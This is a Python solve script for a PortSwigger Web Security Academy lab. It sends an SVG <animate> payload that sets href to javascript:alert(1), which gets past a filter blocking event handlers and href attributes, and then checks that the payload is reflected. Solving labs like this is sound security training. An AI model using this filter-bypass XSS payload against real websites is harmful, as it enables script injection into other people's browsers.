#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab: Reflected XSS with event handlers and href attributes blocked
Uses SVG <animate> to dynamically set href to javascript:alert(1), bypassing static WAF checks.
"""

import argparse
import requests
import urllib3
from urllib.parse import quote

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def main():
    parser = argparse.ArgumentParser(
        description="Solve XSS Lab 27: Event handlers and href blocked"
    )
    parser.add_argument("lab_url", help="Lab URL (e.g. https://0aXX00...web-security-academy.net)")
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    s = requests.Session()
    s.verify = False

    # SVG animate payload — dynamically sets href, bypassing static WAF check
    payload = '<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click here</text></a></svg>'
    exploit_url = f"{lab}/?search={quote(payload)}"
    print(f"[+] Exploit URL:\n    {exploit_url}")

    # Verify payload is reflected
    r = s.get(exploit_url)
    if "animate" in r.text and "attributeName" in r.text:
        print("[+] Payload reflected — SVG animate element present")
    else:
        print("[-] Payload not found in response")

    # Check if lab is solved
    r = s.get(lab)
    if "Congratulations" in r.text:
        print("[+] Lab solved!")
    else:
        print('[*] Open the exploit URL in a browser and click "Click here" to trigger alert(1)')


if __name__ == "__main__":
    main()
